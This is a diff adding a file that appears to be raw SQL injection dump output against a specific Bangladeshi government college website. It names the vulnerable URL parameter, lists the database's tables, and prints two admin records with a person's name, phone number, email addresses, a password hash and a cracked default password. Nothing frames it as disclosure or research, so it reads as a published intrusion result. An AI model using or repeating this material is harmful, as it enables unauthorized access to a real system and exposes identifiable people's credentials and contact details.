@@ -1,0 +1,55 @@
+.gov Government
+
+.bd Bangladesh
+
+Madargonj Ahz Govy College
+
+http://mahzcollege.gov.bd/page.php?id=5
+
+the back-end DBMS is MySQL
+web application technology: Apache
+the back-end DBMS: MySQL >= 5.0.0
+
+available databases [1]:
+[+] gdfleged_oleia
+
+Database: gdfleged_oleia
+[18 tables]
++--------------------------+
+| admin                    |
+| contact                  |
+| department               |
+| external_link            |
+| library                  |
+| menu                     |
+| page                     |
+| photo_album              |
+| photos                   |
+| scroller                 |
+| site                     |
+| slider                   |
+| students                 |
+| students_attendance      |
+| tbl_admin                |
+| teacher_staff            |
+| teacher_staff_attendance |
+| videos                   |
++--------------------------+
+
+Database: gdfleged_oleia
+Table: tbl_admin
+[1 entry]
++----------+------------+--------------------------+--------------------------------------------------------------+
+| fullname | mobile     | email                    | password                                                     |
++----------+------------+--------------------------+--------------------------------------------------------------+
+| Admin    | 1710676814 | mahzgovcollege@yahoo.com | $2y$10$VofBjHi6U5k4N.TIQ/XnAejnY1qmyEcfRVch0XYVJgg5CLphu/y6u |
++----------+------------+--------------------------+--------------------------------------------------------------+
+
+Database: gdfleged_oleia
+Table: admin
+[1 entry]
++-------------------------------+-----------------+------------------------------------------+
+| fullname                      | email           | password                                 |
++-------------------------------+-----------------+------------------------------------------+
+| Professor Dr. Md. Abdul Baten | admin@admin.com | 21232f297a57a5a743894a0e4a801fc3 (admin) |
++-------------------------------+-----------------+------------------------------------------+
